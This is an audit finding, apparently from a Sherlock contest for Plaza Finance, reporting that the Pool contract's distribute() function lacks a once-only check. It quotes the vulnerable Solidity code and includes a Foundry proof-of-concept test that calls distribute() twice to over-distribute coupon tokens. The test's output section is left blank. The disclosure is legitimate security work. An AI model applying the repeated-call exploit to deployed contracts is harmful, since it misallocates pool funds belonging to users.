# Coupon distribution for bondholders can be called multiple times, resulting in more tokens being distributed than originally intended.

### Summary

Pool's coupon tokens can be distributed using a bidding system by creating an auction. After the auction ends, coupon tokens can be distributed according to each bidder's position. To do so, anyone can call the distribute function in the Pool contract. However, the problem lies in the lack of validation to ensure that the distribution has not already been called. This allows for double-spending if the pool still has additional funds, resulting in more funds being distributed to bondholders than what was intended after the auction.

### Root Cause

We can see implementation of `distribute` function in [Pool contract](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Pool.sol#L589-L614):

```solidity
 function distribute() external whenNotPaused {
    (uint256 currentPeriod,) = bondToken.globalPool();
    require(currentPeriod > 0, AccessDenied());

    // Period is increased when auction starts, we want to distribute for the previous period
    uint256 previousPeriod = currentPeriod - 1;
    uint256 couponAmountToDistribute = Auction(auctions[previousPeriod]).totalBuyCouponAmount();

    if (Auction(auctions[previousPeriod]).state() == Auction.State.FAILED_POOL_SALE_LIMIT ||
        Auction(auctions[previousPeriod]).state() == Auction.State.FAILED_UNDERSOLD) {

      emit DistributionRollOver(previousPeriod, couponAmountToDistribute);
      return;
    }

    // Get Distributor
    address distributor = poolFactory.distributors(address(this));

    // Transfer coupon tokens to the distributor
    IERC20(couponToken).safeTransfer(distributor, couponAmountToDistribute);

    // Update distributor with the amount to distribute
    Distributor(distributor).allocate(couponAmountToDistribute);

    emit Distributed(previousPeriod, couponAmountToDistribute, distributor);
  }
```

### Internal Pre-conditions

1. More than one auction has concluded.
2. The pool has more funds than need to be distributed.

### External Pre-conditions

None

### Attack Path

1. Call `distribute` function inside Pool contract several times

### Impact

Pool funds could be misallocated, giving previous auction bidders more than intended.

### PoC

Insert into Distributor.t.sol:

```solidity
function testBugClaimShares() public {
        Token sharesToken = Token(_pool.couponToken());

        vm.startPrank(address(_pool));
        _pool.bondToken().mint(user, 1 * 10 ** 18);
        sharesToken.mint(address(_pool), 50 * (1 + 10000) * 10 ** 18);
        vm.stopPrank();

        vm.startPrank(governance);
        fakeSucceededAuction(address(_pool), 0);

        vm.mockCall(
            address(0),
            abi.encodeWithSignature("state()"),
            abi.encode(uint256(1))
        );

        vm.mockCall(
            address(0),
            abi.encodeWithSignature("totalBuyCouponAmount()"),
            abi.encode(uint256(50 * (1 + 10000) * 10 ** 18))
        );

        // increase indexed asset period - this is done by Pool when Auction starts but its mocked on this test
        _pool.bondToken().increaseIndexedAssetPeriod(params.sharesPerToken);
        vm.stopPrank();

        vm.startPrank(address(_pool));
        sharesToken.mint(address(_pool), 50 * (1 + 10000) * 10 ** 18);
        vm.stopPrank();
        console.log(sharesToken.balanceOf(address(_pool)));
        _pool.distribute();
        console.log(sharesToken.balanceOf(address(_pool)));
        _pool.distribute();
        console.log(sharesToken.balanceOf(address(_pool)));
    }
```

Output:

### Mitigation

Ensure that funds can be distributed only once after auction.
